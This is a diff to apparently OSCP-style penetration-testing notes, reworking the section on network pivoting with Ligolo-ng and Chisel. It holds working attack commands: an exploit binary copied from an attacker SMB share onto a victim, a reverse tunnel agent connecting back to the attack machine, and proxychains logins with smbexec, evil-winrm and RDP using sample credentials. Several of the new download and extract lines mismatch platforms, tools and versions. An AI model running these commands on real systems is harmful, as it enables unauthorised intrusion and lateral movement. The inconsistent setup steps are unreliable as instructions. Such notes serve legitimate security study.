@@ -1950,9 +1950,47 @@ C:\>net use \\[host]\[share name]
 C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
 ```
 
-## Pivoting for lateral movement
+## Pivoting for lateral movement (Ligolo-ng)
 - https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
-### Using Chisel
+- https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2
+- Agent (Linux Jump host): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip`
+- Agent (Windows Jump host):  `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_windows_amd64.zip`
+- Proxy (Kali): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz`
+- tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz
+- tar -xzvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
+
+ ```bash
+#Pre-pivoting set up on kali
+**##Jumphost is 172.16.5.129 and connects to target 172.16.5.19**
+$ sudo ip tuntap add user [your_username] mode tun ligolo
+$ sudo ip link set ligolo up
+
+@Attack Machine
+./proxy -selfcert -laddr 0.0.0.0:9001
+
+@Jump Host
+./agent -connect <attack machine IP>:9001 -ignore-cert
+
+![image](https://github.com/user-attachments/assets/d7d3e485-a34b-4de6-8d2a-7dd043e7a492)
+@Attack Machine
+#purpose: add a ip route to tell the router to send our packets to that internal network. 
+#To add a route and access the internal network execute the command in your attack machine.
+sudo ip route add 172.16.4.0/23 dev ligolo
+
+@Attack Machine
+#choosing and starting session
+session
+1
+start
+
+@Attack Machine
+#open new CMD and RDP to target
+rdesktop -u victor -p 'password' 172.16.5.19
+```
+
+- [Full guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
+  
+## Pivoting Using Chisel and Port Forwarding Using Chisel
 - https://blog.mkiesel.ch/posts/oscp_pivoting/
 - https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
 
@@ -1983,14 +2021,10 @@ proxychains -q ssh user@10.0.60.99
 proxychains -q mysql -u dbuser -h 10.0.60.99
 proxychains -q impacket-smbexec domain\user: -target-ip  10.0.60.99
 proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
+proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 #or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
 ```
-
-### Using Ligolo-ng
-- Agent (victim): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz`
-- Proxy (Kali): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz`
-- [Full guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
 
 ## compiling windows exploit on kali
 ```bash
